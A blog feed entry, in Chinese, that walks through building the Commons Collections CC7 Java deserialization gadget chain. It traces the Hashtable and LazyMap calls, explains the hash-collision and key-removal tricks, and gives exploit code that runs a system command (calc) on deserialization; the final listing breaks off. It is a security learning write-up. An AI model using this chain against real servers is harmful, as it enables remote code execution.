<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>雲流のLowest World</title>
  
  
  <link href="http://c1oudfl0w0.github.io/blog/atom.xml" rel="self"/>
  
  <link href="http://c1oudfl0w0.github.io/blog/"/>
  <updated>2024-09-06T10:11:23.717Z</updated>
  <id>http://c1oudfl0w0.github.io/blog/</id>
  
  <author>
    <name>C1oudfL0w0</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CC7链</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/09/06/CC7%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/09/06/CC7%E9%93%BE/</id>
    <published>2024-09-06T07:28:19.000Z</published>
    <updated>2024-09-06T10:11:23.717Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CC7 的链子和 CC5 类似，后半条链子也是 <code>LazyMap.get()</code> 的链子，然后也换了个入口类</p><p>参考：</p><p><a href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/">https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE/</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-7-CC7</a></p><span id="more"></span><hr><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>图来</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906153352265.png" alt="image-20240906153352265"></p><p><code>equals</code>太多了，依旧是正向分析</p><p>直接看入口类<code>Hashtable</code>的 readObject</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906154206147.png" alt="image-20240906154206147"></p><p>调用了个<code>reconstitutionPut()</code>方法，跟过去看看</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906154323124.png" alt="image-20240906154323124"></p><p>发现个熟悉的<code>hashCode()</code>，不过这样的话就进 cc6 了，我们的目标还是这里 cc7 的 <code>equals</code></p><p>查找用法的话<code>equals</code>太多了，直接 ctrl+shift+a 全局搜索找<code>AbstractMapDecorator</code>这个类</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906154859596.png" alt="image-20240906154859596"></p><p>继承了 Map 接口，因为它是 CC 包里面的 Map 类，并且能够调用父类 Map，所以把它作为链子的一部分</p><p>但是 Map 是一个接口，我们还需要去找 Map 的实现类</p><p>最终在 <code>AbstractMap</code> 类中的 <code>equals()</code> 方法中发现其调用了 <code>get()</code> 方法</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906155944043.png" alt="image-20240906155944043"></p><p>那么只需要让 m 可控为 LazyMap 即可连上链子</p><hr><h1 id="写exp"><a href="#写exp" class="headerlink" title="写exp"></a>写exp</h1><p>LazyMap.get 的部分直接复制粘贴，这里不提了</p><p>而上面的链子连起来就是：<code>Hashtable.readObject</code> -&gt; <code>Hashtable.reconstitutionPut</code> -&gt; <code>Abstracecorator.equals</code> -&gt; <code>AbstractMap.equals</code></p><p>看起来好像是四个步骤，但是其实<code>AbstractMapequals</code>这里，首先是调用<code>LazyMap.equals</code>，但是 LazyMap 没这个方法才找父类找到了<code>AbstractMap.equals</code></p><p>接下来分析每段方法的参数</p><p>首先是 readObject：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">// Read the number of elements and then all the key/value objects</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> elements <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> elements<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token class-name">K</span> key <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">K</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>    <span class="token class-name">V</span> value <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">V</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// synch could be eliminated for performance</span>    <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span>table<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里<code>reconstitutionPut</code>是在一个for循环里面的</p><p>然后是 reconstitutionput：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">  <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">reconstitutionPut</span><span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span><span class="token punctuation">[</span><span class="token punctuation">]</span> tab<span class="token punctuation">,</span> <span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name">StreamCorruptedException</span>  <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>value <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token comment">// Makes sure the key is not already in the hashtable.</span>      <span class="token comment">// This should not happen in deserialized version.</span>      <span class="token keyword">int</span> hash <span class="token operator">=</span> key<span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> index <span class="token operator">=</span> <span class="token punctuation">(</span>hash <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span> <span class="token operator">%</span> tab<span class="token punctuation">.</span>length<span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> tab<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> e<span class="token punctuation">.</span>key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>StreamCorruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token comment">// ...</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里对传进的 Entry 对象数组进行了循环，逐个调用<code>e.key.equals(key)</code></p><p>到这里就要看一下 key 是啥了，溯源发现在 writeObject 方法里</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906161127119.png" alt="image-20240906161127119"></p><p>其实 key 就是我们第一次 put 进去的 key，那么写法就是：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>于是写exp：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc7</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"getMethod"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"invoke"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"exec"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> decorateMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap<span class="token punctuation">,</span> <span class="token string">"0w0"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> barr <span class="token operator">=</span> <span class="token class-name">Utils<span class="token punctuation">.</span>Serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Utils<span class="token punctuation">.</span>UnSerialize</span><span class="token punctuation">(</span>barr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后运行，无事发生。。</p><p>下断点发现根本没进<code>AbstractMap.equals()</code>，看看 ysoserial 是怎么做的</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906162401912.png" alt="image-20240906162401912"></p><p>ysoserial 这里的链子多了一个 map，还把两个 map 进行了比较</p><h2 id="调用两次-put"><a href="#调用两次-put" class="headerlink" title="调用两次 put"></a>调用两次 put</h2><p>我们需要调用的 <code>e.key.equals()</code> 方法是在 for 循环里面的，需要进入到这个 for 循环才能调用</p><p><code>Hashtable</code> 的 <code>reconstitutionPut()</code> 方法是被遍历调用的</p><p>第一次调用的时候，并不会走入到 <code>reconstitutionPut()</code> 方法 for 循环里面，因为 <code>tab[index]</code> 的内容是空的</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906163306716.png" alt="image-20240906163306716"></p><p>在下面才会对 <code>tab[index]</code> 进行赋值</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906163415877.png" alt="image-20240906163415877"></p><p>所以需要两次put赋值才能进入</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"aaa"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"bbb"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（这里是栈结构，所以最后put进去的会成为第一个<code>tab[index]</code>）</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906165008258.png" alt="image-20240906165008258"></p><p>然而这样子依旧不能进，调试了半天发现问题出在了hash上面</p><h2 id="指定key的值"><a href="#指定key的值" class="headerlink" title="指定key的值"></a>指定key的值</h2><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906172408833.png" alt="image-20240906172408833"></p><p><code>table[1]</code>是 decorateMap2 的值，而索引之所以是1也是从<code>int index = (hash &amp; 0x7FFFFFFF) % tab.length;</code>来的，而 decorateMap1 的key（即&quot;aaa&quot;）经过hash处理之后为 96320，decorateMap2 的key（&quot;bbb&quot;）的hash是97315，两者得到的index不相等，所以连 for 循环都进不去</p><p>那么要让<code>(hash &amp; 0x7FFFFFFF) % tab.length</code>相等，这样才能匹配上index，而且注意到下面还有<code>e.hash == hash</code>的判断，因此问题就转变为如何让这两个 key 的 hash 相等</p><p>在java中有这样的一个特性：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token string">"yy"</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"zZ"</span><span class="token punctuation">.</span><span class="token function">hashCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>yy</code> 和 <code>zZ</code> 由 <code>hashCode()</code> 计算出来的值是一样的。正是这个小 bug 让这里能够利用，所以这里我们需要将 map 中 <code>put()</code> 的值设置为 <code>yy</code> 和 <code>zZ</code>，才能走到我们想要的 <code>e.key.equals()</code> 方法中</p><p>所以要这样写：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap1 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap1<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap1<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Map</span> decorateMap2 <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>hashMap2<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>decorateMap2<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"zZ"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap1<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>decorateMap2<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906173304535.png" alt="image-20240906173304535"></p><p>然后就调用<code>decorateMap1.equals(decorateMap2)</code></p><p>不过这样还是弹不了计算器</p><h2 id="remove"><a href="#remove" class="headerlink" title="remove"></a>remove</h2><p>这是因为 <code>HashTable.put()</code> 实际上也会调用到 <code>equals()</code> 方法</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906173615414.png" alt="image-20240906173615414"></p><p>当调用完 <code>equals()</code> 方法后，decorateMap2 的 key 中就会增加一个 yy 键，然后在 AbstractMap 这里执行 <code>value.equals(m.get(key))</code> 时取到的key是 yy</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906175652192.png" alt="image-20240906175652192"></p><p>而AbstractMap里的key是什么呢</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906175842781.png" alt="image-20240906175842781"></p><p>由于我们是先调用了 HashMap 里的 equals 后才到的 AbstractMap ，因此这个 entryset 也就是 HashMap 的，decorateMap1 里放的就是 HashMap1，里面的键是 yy</p><p><img src="/blog/2024/09/06/CC7%E9%93%BE/image-20240906181016837.png" alt="image-20240906181016837"></p><p>于是在这之后 decorateMap2 的 key 中就会增加一个 yy 键，这就不能满足 hash 碰撞了，构造序列化链的时候是满足的，但是构造完成之后就不满足了，那么经过对方服务器反序列化也不能满足 hash 碰撞了，也就不会执行系统命令了，所以就在构造完序列化链之后手动删除这多出来的一组键值对</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">decorateMap2<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"yy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h1 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h1><p>为了防止序列化提前弹计算器，要改一下 chainedTransformer 为<code>ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);</code>，后面再反射赋值</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>cc7</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span></span><span class="token class-name">Utils</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections<span class="token punctuation">.</span>map<span class="token punctuation">.</span></span><span class="token class-name">LazyMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Map</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token 